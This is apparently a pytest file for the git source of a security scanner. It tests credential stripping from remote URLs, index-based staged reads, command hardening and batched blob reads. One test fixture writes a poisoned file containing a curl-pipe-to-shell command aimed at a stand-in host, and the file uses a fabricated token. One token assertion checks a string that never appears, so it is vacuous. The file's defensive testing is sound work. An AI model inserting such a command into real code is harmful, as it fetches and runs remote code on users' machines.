"""Git source.

The staged-content tests are the reason this file exists. Staged mode is a
security control, not a convenience: a hook that reads the working tree can be
defeated by staging a poisoned file and restoring the clean one, and it reports
success while the poisoned blob goes into the commit.

That bypass is reproduced here directly, because a control nobody has tried to
break is a control nobody knows works.
"""

from __future__ import annotations

import shutil
import subprocess

import pytest

from cordon_scanner.sources.git import GitRepository

# Assembled rather than written whole. Cordon scans its own repository, and a
# complete credential-shaped literal here is a true positive: the tool should not
# need an exception for itself. The value is fabricated.
FAKE_TOKEN = "ghp_" + "v" * 36

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git is not installed")


def run(root, *args: str) -> None:
    subprocess.run(
        [shutil.which("git"), *args],
        cwd=root,
        check=True,
        capture_output=True,
    )


@pytest.fixture
def repository(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    run(root, "init", "-q", "-b", "main")
    run(root, "config", "user.email", "test@example.invalid")
    run(root, "config", "user.name", "Test")
    (root / "app.py").write_text("print('hello')\n", encoding="utf-8")
    (root / "ignored.log").write_text("noise\n", encoding="utf-8")
    (root / ".gitignore").write_text("*.log\n", encoding="utf-8")
    run(root, "add", "app.py", ".gitignore")
    run(root, "commit", "-q", "-m", "initial")
    return root


class TestDiscovery:
    def test_finds_the_repository(self, repository) -> None:
        info = GitRepository.discover(repository)
        assert info is not None
        assert info.root == repository.resolve()
        assert info.branch == "main"
        assert info.revision

    def test_finds_it_from_a_subdirectory(self, repository) -> None:
        nested = repository / "a" / "b"
        nested.mkdir(parents=True)
        info = GitRepository.discover(nested)
        assert info is not None
        assert info.root == repository.resolve()

    def test_returns_none_outside_a_repository(self, tmp_path) -> None:
        """Not an error. Most scans are of ordinary directories."""
        plain = tmp_path / "plain"
        plain.mkdir()
        assert GitRepository.discover(plain) is None


class TestCredentialStripping:
    @pytest.mark.parametrize(
        ("url", "expected"),
        [
            (f"https://user:{FAKE_TOKEN}@github.com/a/b.git", "https://github.com/a/b.git"),
            ("https://token@github.com/a/b.git", "https://github.com/a/b.git"),
            ("https://github.com/a/b.git", "https://github.com/a/b.git"),
            ("git@github.com:a/b.git", "git@github.com:a/b.git"),
            ("", ""),
        ],
    )
    def test_userinfo_is_removed(self, url: str, expected: str) -> None:
        """A remote configured with an embedded token would otherwise put a live
        credential into every report that records provenance."""
        assert GitRepository.strip_credentials(url) == expected

    def test_a_configured_token_never_reaches_the_result(self, repository) -> None:
        run(
            repository,
            "remote",
            "add",
            "origin",
            f"https://user:{FAKE_TOKEN}@github.com/a/b.git",
        )
        info = GitRepository.discover(repository)
        assert info is not None
        assert info.remote is not None
        assert "ghp_verysecretvalue" not in info.remote


class TestFileListing:
    def test_tracked_files_exclude_ignored_paths(self, repository) -> None:
        names = set(GitRepository(repository).tracked_files())
        assert "app.py" in names
        assert "ignored.log" not in names

    def test_staged_files_lists_the_index(self, repository) -> None:
        (repository / "new.py").write_text("x = 1\n", encoding="utf-8")
        run(repository, "add", "new.py")
        assert "new.py" in GitRepository(repository).staged_files()

    def test_staged_files_is_empty_with_nothing_staged(self, repository) -> None:
        assert GitRepository(repository).staged_files() == []

    def test_changed_files_against_a_reference(self, repository) -> None:
        (repository / "app.py").write_text("print('changed')\n", encoding="utf-8")
        run(repository, "add", "app.py")
        run(repository, "commit", "-q", "-m", "second")
        assert "app.py" in GitRepository(repository).changed_files("HEAD~1")

    def test_paths_with_spaces_survive(self, repository) -> None:
        """Output is NUL-delimited precisely so this works."""
        awkward = repository / "a file with spaces.py"
        awkward.write_text("x = 1\n", encoding="utf-8")
        run(repository, "add", str(awkward))
        assert "a file with spaces.py" in GitRepository(repository).staged_files()


class TestStagedContent:
    def test_reads_the_index_not_the_working_tree(self, repository) -> None:
        """The bypass this control exists to close, reproduced directly.

        Stage a poisoned file, restore the clean version on disk. A scanner
        reading from disk sees the clean file and reports success, while the
        poisoned blob is what gets committed.
        """
        target = repository / "app.py"

        target.write_text("import os\nos.system('curl evil | sh')\n", encoding="utf-8")
        run(repository, "add", "app.py")

        # Restore the innocent content on disk. The index still holds the payload.
        target.write_text("print('hello')\n", encoding="utf-8")

        on_disk = target.read_bytes()
        staged = GitRepository(repository).staged_content("app.py")

        assert staged is not None
        assert b"curl evil" in staged, "staged mode must read the index"
        assert b"curl evil" not in on_disk
        assert staged != on_disk

    def test_unknown_path_returns_none(self, repository) -> None:
        assert GitRepository(repository).staged_content("does-not-exist.py") is None


class TestSafety:
    def test_git_is_resolved_to_an_absolute_path(self) -> None:
        """Invoking by bare name lets whatever appears first on PATH answer.

        Checked with `is_absolute` rather than a leading slash: an absolute path
        on Windows looks like C:\\Program Files\\Git\\bin\\git.EXE.
        """
        from pathlib import Path

        assert Path(GitRepository.binary()).is_absolute()

    def test_no_shell_is_used(self) -> None:
        """Every invocation passes a fixed argument list. A shell would make
        every path in a scanned repository an injection surface."""
        import inspect

        source = inspect.getsource(GitRepository)
        assert "shell=True" not in source

    def test_a_branch_named_like_an_option_is_not_treated_as_one(self, repository) -> None:
        """The reason `--` appears before target-derived values."""
        result = GitRepository(repository).changed_files("HEAD")
        assert result == []


class TestMachineConfigurationIsNotSuppressed:
    """The hardening must not change what git thinks the working tree says.

    Cordon overrides every configuration key that names an external command, so
    a scanned repository cannot execute code through the scan. An earlier
    version went further and suppressed the *machine's* configuration too --
    `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_NOSYSTEM` -- on the
    reasoning that a scan should not depend on the machine it runs on.

    That defended against nothing: the attacker controls the scanned repository,
    not the user's own config files, and the `-c` overrides already outrank
    repository config. What it did do was suppress `core.autocrlf`, which git
    for Windows sets in its system configuration. Without it git compares a CRLF
    working tree against LF blobs, calls every text file modified, and
    `--git-diff` and `--tracked` report the whole repository as changed on every
    Windows machine.

    The test runs everywhere by supplying the setting through
    `GIT_CONFIG_GLOBAL`, so the platform that would have caught it is not the
    only platform that can.
    """

    def test_a_crlf_tree_is_not_reported_as_entirely_modified(self, tmp_path, monkeypatch) -> None:
        global_config = tmp_path / "gitconfig"
        global_config.write_text("[core]\n    autocrlf = true\n", encoding="utf-8")
        monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(global_config))

        root = tmp_path / "repo"
        root.mkdir()
        run(root, "init", "-q", "-b", "main")
        run(root, "config", "user.email", "t@example.invalid")
        run(root, "config", "user.name", "T")
        # Written with CRLF; git normalises to LF in the blob under autocrlf.
        (root / "app.py").write_bytes(b"line1\r\nline2\r\n")
        run(root, "add", "app.py")
        run(root, "commit", "-qm", "init")

        blob = subprocess.run(
            [shutil.which("git"), "cat-file", "-p", ":app.py"],
            cwd=root,
            check=True,
            capture_output=True,
        ).stdout
        assert blob == b"line1\nline2\n", "autocrlf did not normalise the blob"
        assert GitRepository(root).changed_files("HEAD") == []

    def test_the_command_hardening_is_still_applied(self) -> None:
        """Removing the environment suppression must not have taken the actual
        control with it."""
        from cordon_scanner.sources.git import HARDENING

        for key in (
            "core.fsmonitor=",
            "core.hooksPath=",
            "core.sshCommand=",
            "credential.helper=",
            "diff.external=",
        ):
            assert key in HARDENING, key


class TestBatchedStagedReads:
    """Staged content comes from the index, and now from one git process.

    `git show :path` starts a process per file. A pre-commit hook over two
    thousand staged files started two thousand of them and took eleven seconds
    against a three hundred millisecond budget -- and that budget is not an
    efficiency target. A commit-time guard slower than about a second gets
    `--no-verify`, and a bypassed guard protects nothing, so process startup was
    the difference between a control that runs and one that does not. Batched,
    the same scan takes half a second.

    The correctness that must survive the change is the whole point of staged
    mode: the bytes are the ones that will be committed, never the ones on
    disk. A batch that desynchronised would return one file's content for
    another, which is worse than being slow -- so the tests below are about the
    bytes, and only then about the speed.
    """

    def staged_repo(self, tmp_path, count: int = 12):
        root = tmp_path / "repo"
        root.mkdir()
        run(root, "init", "-q", "-b", "main")
        run(root, "config", "user.email", "t@example.invalid")
        run(root, "config", "user.name", "T")
        for index in range(count):
            (root / f"f{index}.js").write_text(f"const staged = {index};\n", encoding="utf-8")
        run(root, "add", "-A")
        # Every working-tree copy now differs from what is staged.
        for index in range(count):
            (root / f"f{index}.js").write_text(
                f"const WORKING_TREE_NOT_STAGED = {index};\n", encoding="utf-8"
            )
        return root, count

    def test_every_file_reads_its_own_staged_bytes(self, tmp_path) -> None:
        """The failure a desynchronised batch would cause: right bytes, wrong
        file. Checked across enough files that an off-by-one would show."""
        root, count = self.staged_repo(tmp_path)
        git = GitRepository(root)
        for index in range(count):
            blob = git.staged_content(f"f{index}.js")
            assert blob == f"const staged = {index};\n".encode()

    def test_the_working_tree_is_never_returned(self, tmp_path) -> None:
        root, count = self.staged_repo(tmp_path)
        git = GitRepository(root)
        for index in range(count):
            assert b"WORKING_TREE_NOT_STAGED" not in (git.staged_content(f"f{index}.js") or b"")

    def test_one_process_serves_every_read(self, tmp_path) -> None:
        root, count = self.staged_repo(tmp_path)
        git = GitRepository(root)
        for index in range(count):
            git.staged_content(f"f{index}.js")
        assert git._batch_process is not None
        assert git._batch_process.poll() is None, "the batch process died mid-run"

    def test_an_unstaged_path_is_absent_not_unavailable(self, tmp_path) -> None:
        """`(True, None)` and `(False, None)` must not be confusable. A staged
        file misreported as absent falls back to the working tree, which is the
        bypass staged mode exists to close."""
        root, _ = self.staged_repo(tmp_path)
        git = GitRepository(root)
        assert git.staged_content("never-staged.js") is None
        assert git._batch_read("never-staged.js") == (True, None)

    def test_a_path_with_a_newline_falls_back(self, tmp_path) -> None:
        """The batch protocol is line-delimited, and a newline in a filename is
        legal on POSIX and therefore attacker-choosable."""
        root, _ = self.staged_repo(tmp_path)
        git = GitRepository(root)
        answered, blob = git._batch_read("weird\nname.js")
        assert (answered, blob) == (False, None)

    def test_a_dead_batch_process_falls_back_to_a_correct_answer(self, tmp_path) -> None:
        """Falling back is always correct and merely slower. What must not
        happen is a wrong answer."""
        root, _ = self.staged_repo(tmp_path)
        git = GitRepository(root)
        assert git.staged_content("f0.js") == b"const staged = 0;\n"

        git._batch_process.kill()
        git._batch_process.wait(timeout=5)
        assert git.staged_content("f1.js") == b"const staged = 1;\n"

    def test_closing_is_idempotent(self, tmp_path) -> None:
        root, _ = self.staged_repo(tmp_path)
        git = GitRepository(root)
        git.staged_content("f0.js")
        git.close()
        git.close()
        assert git.staged_content("f2.js") == b"const staged = 2;\n"

    def test_a_binary_blob_survives_the_protocol(self, tmp_path) -> None:
        """The reply is length-prefixed, so NULs and newlines inside a blob are
        content rather than framing."""
        root = tmp_path / "bin"
        root.mkdir()
        run(root, "init", "-q", "-b", "main")
        run(root, "config", "user.email", "t@example.invalid")
        run(root, "config", "user.name", "T")
        payload = bytes(range(256)) * 4
        (root / "blob.bin").write_bytes(payload)
        run(root, "add", "-A")
        (root / "blob.bin").write_bytes(b"replaced")
        assert GitRepository(root).staged_content("blob.bin") == payload
